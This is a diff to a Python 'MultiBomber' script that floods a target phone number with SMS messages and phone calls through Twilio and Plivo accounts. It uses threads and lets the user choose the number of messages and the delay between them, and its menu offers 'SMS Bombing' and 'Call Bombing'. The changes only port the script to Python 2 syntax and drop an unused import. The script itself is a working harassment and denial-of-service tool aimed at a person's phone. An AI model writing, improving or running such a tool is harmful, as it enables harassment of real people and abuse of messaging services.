@@ -1,7 +1,6 @@
 import json
 import time
 import threading
-import requests
 from twilio.rest import Client
 from plivo import RestClient
 
@@ -21,10 +20,10 @@ class MultiBomber:
                     from_=provider['from'],
                     to=target
                 )
-                print(f"[+] SMS {i+1} sent via Twilio (SID: {message.sid})")
+                print("[+] SMS {} sent via Twilio (SID: {})".format(i+1, message.sid))
                 time.sleep(delay)
             except Exception as e:
-                print(f"[-] Twilio SMS Error: {e}")
+                print("[-] Twilio SMS Error: {}".format(e))
 
     def send_sms_plivo(self, provider, target, count, delay):
         client = RestClient(provider['auth_id'], provider['auth_token'])
@@ -35,10 +34,10 @@ class MultiBomber:
                     dst=target,
                     text='Automated Alert Notification'
                 )
-                print(f"[+] SMS {i+1} sent via Plivo")
+                print("[+] SMS {} sent via Plivo".format(i+1))
                 time.sleep(delay)
             except Exception as e:
-                print(f"[-] Plivo SMS Error: {e}")
+                print("[-] Plivo SMS Error: {}".format(e))
 
     def make_call_twilio(self, provider, target, count, delay):
         client = Client(provider['sid'], provider['token'])
@@ -49,25 +48,24 @@ class MultiBomber:
                     from_=provider['from'],
                     to=target
                 )
-                print(f"[+] Call {i+1} initiated via Twilio (SID: {call.sid})")
+                print("[+] Call {} initiated via Twilio (SID: {})".format(i+1, call.sid))
                 time.sleep(delay)
             except Exception as e:
-                print(f"[-] Twilio Call Error: {e}")
+                print("[-] Twilio Call Error: {}".format(e))
 
     def run(self):
         print("--- Automated SMS/Call Utility ---")
         print("1. SMS Bombing")
         print("2. Call Bombing")
-        choice = input("Select option: ")
+        choice = raw_input("Select option: ") if hasattr(__builtins__, 'raw_input') else input("Select option: ")
         
-        target = input("Enter target number (with country code, e.g., +1234567890): ")
-        amount = int(input("Enter total amount to send: "))
-        delay = float(input("Enter delay between requests (seconds): "))
+        target = raw_input("Enter target number (with country code, e.g., +1234567890): ") if hasattr(__builtins__, 'raw_input') else input("Enter target number (with country code, e.g., +1234567890): ")
+        amount = int(raw_input("Enter total amount to send: ") if hasattr(__builtins__, 'raw_input') else input("Enter total amount to send: "))
+        delay = float(raw_input("Enter delay between requests (seconds): ") if hasattr(__builtins__, 'raw_input') else input("Enter delay between requests (seconds): "))
 
         threads = []
         
         if choice == '1':
-            # Split the workload across available SMS providers
             per_provider = amount // len(self.sms_providers)
             for provider in self.sms_providers:
                 if provider['name'] == 'Twilio':
